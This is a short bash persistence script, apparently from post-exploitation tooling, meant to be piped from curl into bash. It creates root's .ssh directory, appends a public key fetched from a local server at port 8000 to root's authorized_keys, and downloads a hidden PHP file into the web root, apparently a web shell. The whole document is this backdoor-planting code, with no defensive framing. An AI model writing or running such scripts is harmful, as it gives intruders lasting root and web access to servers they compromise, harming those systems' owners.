#!/bin/bash
# curl 127.0.0.1:8000/persistence.sh | bash

mkdir /root/.ssh/
chmod 700 /root/.ssh/
curl 127.0.0.1:8000/key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
curl 127.0.0.1:8000/home.php -o /var/www/html/.home.php
